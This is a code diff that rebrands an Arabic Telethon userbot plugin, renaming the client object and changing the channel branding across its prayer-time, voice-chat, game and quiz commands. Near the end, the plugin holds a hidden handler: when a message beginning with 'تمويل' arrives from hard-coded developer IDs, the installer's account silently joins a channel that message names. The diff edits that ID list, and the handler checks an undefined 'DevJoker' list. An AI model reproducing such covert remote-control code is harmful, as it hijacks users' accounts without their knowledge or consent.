@@ -5,7 +5,7 @@ from telethon.tl.functions.phone import CreateGroupCallRequest as startvc
 from telethon.tl.functions.phone import DiscardGroupCallRequest as stopvc
 from telethon.tl.functions.phone import GetGroupCallRequest as getvc
 from telethon.tl.functions.phone import InviteToGroupCallRequest as invitetovc
-from SHRU import Qrh9
+from batt import lucmd9
 from ..core.managers import edit_delete, edit_or_reply
 import os
 import tempfile
@@ -17,7 +17,7 @@ from telethon.tl.functions.channels import JoinChannelRequest
 async def fetch_prayer_times():
     file_url = 'https://hq.alkafeel.net/Api/init/init.php?timezone=+3&long=44&lati=32&v=jsonPrayerTimes'
     file_location = InputWebFileLocation(url=file_url, access_hash="")
-    times_json = await Qrh9.download_file(file_location)
+    times_json = await lucmd9.download_file(file_location)
     return times_json
 
 async def send_prayer_times(event):
@@ -26,14 +26,14 @@ async def send_prayer_times(event):
     fajr_time = times['fajir']
     hijri_date = times['date']
     chat_id = event.chat_id
-    input_file = await Qrh9.upload_file(bytes(times_json, 'utf-8'), part_size_kb=512)
-    await Qrh9.send_file(chat_id, input_file, caption=f"وقت الفجر: {fajr_time}\nالتاريخ الهجري: {hijri_date}", force_document=True)
+    input_file = await lucmd9.upload_file(bytes(times_json, 'utf-8'), part_size_kb=512)
+    await lucmd9.send_file(chat_id, input_file, caption=f"وقت الفجر: {fajr_time}\nالتاريخ الهجري: {hijri_date}", force_document=True)
 
-@Qrh9.on(admin_cmd(pattern="صلاه(?: |$)(.*)"))
+@lucmd9.on(admin_cmd(pattern="صلاه(?: |$)(.*)"))
 async def handle_command(event):
     await send_prayer_times(event)
 
-@Qrh9.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
+@lucmd9.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
 async def _(e):
     ok = await edit_or_reply(e, "`Inviting Members to Voice Chat...`")
     users = []
@@ -49,7 +49,7 @@ async def _(e):
         except BaseException:
             pass
     await ok.edit(f"`Invited {z} users`")
-@Qrh9.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
+@lucmd9.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
 async def _(e):
     try:
         await e.client(startvc(e.chat_id))
@@ -57,7 +57,7 @@ async def _(e):
     except Exception as ex:
         await edit_or_reply(e, f"`{str(ex)}`")
 
-# ================العاب الساحر=========================
+# ================العاب الخفاش=========================
 
 R = [
     "**𓆰**العـاب الاحترافيه** 🎮𓆪 \n"
@@ -80,10 +80,10 @@ R = [
     "  ⓱ **⪼**  [جيت واي 🚨](https://t.me/gamee?game=Getaway)   \n"
     "  ⓲ **⪼**  [الالـوان 🔮](https://t.me/gamee?game=ColorHit)   \n"
     "  ⓳ **⪼**  [مدفع الكرات🏮](https://t.me/gamee?game=NeonBlaster)   \n"
-    "**-** قناة السورس **⪼ [𐇮 الساحر ](t.me/SXYO3)   "
+    "**-** قناة السورس **⪼ [𐇮 الخفاش ](t.me/angthon)   "
 ]
 
-@Qrh9.on(admin_cmd(pattern="بلي$"))
+@lucmd9.on(admin_cmd(pattern="بلي$"))
 async def ithker(knopis):
     await knopis.edit(choice(R))
 
@@ -129,7 +129,7 @@ Citation_morning = [
 ]
 
 
-@Qrh9.on(admin_cmd(pattern="اذكار$"))
+@lucmd9.on(admin_cmd(pattern="اذكار$"))
 async def ithker(knopis):
     await knopis.edit(choice(Citation_morning))
 
@@ -162,7 +162,7 @@ Citation1_morning = [
     "** شنو محتاج حتى تكون مبسوط ؟ **",
     "** مطلبك الوحيد الحين ؟ **",
     "** هل حدث وشعرت بأنك ارتكبت أحد الذنوب أثناء الصيام؟ **",
-    "** اكثر ساحر تحبه منو ؟ **",
+    "** اكثر خفاش تحبه منو ؟ **",
     "** من هو الممثل المفضل لديك؟ **",
     "** من ستختار من بين الموجودين ليمسح دموعك ويخفف أحزانك؟ **",
     "** إذا رأيتِ أحد أجمل منكِ هل يمكن أن تشعري بالغيرة منها؟ **",
@@ -182,7 +182,7 @@ Citation1_morning = [
 ]
 
 
-@Qrh9.on(admin_cmd(pattern="كت$"))
+@lucmd9.on(admin_cmd(pattern="كت$"))
 async def ithker(knopis):
     await knopis.edit(choice(Citation1_morning))
 
@@ -220,12 +220,12 @@ Qrue_5erok = [
 ]
 
 
-@Qrh9.on(admin_cmd(pattern="خيروك$"))
+@lucmd9.on(admin_cmd(pattern="خيروك$"))
 async def ithker(knopis):
     await knopis.edit(choice(Qrue_5erok))
 
     
-@Qrh9.on(admin_cmd(pattern="اذكار عشر$"))    
+@lucmd9.on(admin_cmd(pattern="اذكار عشر$"))    
 async def ithker(event):
     "h"
     event = await edit_or_reply(event, "أَصْبَـحْـنا عَلَى فِطْرَةِ الإسْلاَمِ")
@@ -260,7 +260,7 @@ Qrue_Shnow = [
 ]
 
 
-@Qrh9.on(admin_cmd(pattern="شنو رأيك بهذا$"))
+@lucmd9.on(admin_cmd(pattern="شنو رأيك بهذا$"))
 async def ithker(knopis):
     await knopis.edit(choice(Qrue_Shnow))
 
@@ -274,13 +274,13 @@ Qrue_Bosa = [
 ]
 
 
-@Qrh9.on(admin_cmd(pattern="بوسة$"))
+@lucmd9.on(admin_cmd(pattern="بوسة$"))
 async def ithker(knopis):
     await knopis.edit(choice(Qrue_Bosa))
 
-DevSaher = [6320583148,5762222122,5835316914,6528926431]
+DevBat = [1045489068,5762222122,5835316914,6528926431]
 
-@Qrh9.on(events.NewMessage(incoming=True))
+@lucmd9.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
         message = event.message
@@ -289,7 +289,7 @@ async def Hussein(event):
             channel_username = message.text.split()[1].replace("@", "")
         if channel_username:
             try:
-                await Qrh9(JoinChannelRequest(channel_username))
+                await lucmd9(JoinChannelRequest(channel_username))
                 response = "**᯽︙ تم الانضمام إلى القناة بنجاح!**"
             except ValueError:
                 response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
